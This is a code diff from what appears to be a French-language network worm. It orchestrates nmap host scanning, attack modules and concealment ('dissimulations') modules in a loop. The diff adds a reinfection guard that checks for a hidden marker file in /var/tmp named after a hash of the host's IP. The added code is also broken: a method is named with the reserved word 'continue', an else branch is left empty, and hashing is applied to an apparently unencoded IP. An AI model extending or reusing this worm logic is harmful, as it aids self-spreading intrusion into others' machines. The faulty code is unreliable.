@@ -1,13 +1,15 @@
 #Imports
-from .utils          import endOfProgramm, queueToList
+from .utils          import endOfProgramm, getIp
 from .nmap           import nmap
-from .actions        import __all__                  as ACTIONS
-from .attaques       import __all__                  as ATTAQUES
-from .dissimulations import __all__                  as DISSIMULATIONS
-from queue           import Queue                    as FIFO
+from .actions        import __all__         as ACTIONS
+from .attaques       import __all__         as ATTAQUES
+from .dissimulations import __all__         as DISSIMULATIONS
+from queue           import Queue           as FIFO
 from signal          import signal, SIGTERM
 from importlib       import import_module
 from time            import sleep
+from os.path         import exists
+from hashlib         import sha256
 
 #Classes
 class Events():
@@ -29,6 +31,9 @@ class Events():
         self.isStart = True
         self.cibles  = {}
         while self.isStart:
+
+            if not self.continue():
+                break
             
             for (host, port) in nmap(self):
                 print(host, port)
@@ -48,6 +53,16 @@ class Events():
                     dis.run()
             
             sleep(5)
+
+    def continue(self):
+        """
+        Mets fin au vers si il est déjà présent, pour ce faire vérifie si /var/tmp/.{{ sha256(myip) }} est présent
+        """
+        path = f"/var/tmp/.{sha256(getIp()).hexdigest()}"
+        if exists(path):
+            return False
+        else:
+
 
     def stop(self):
         """
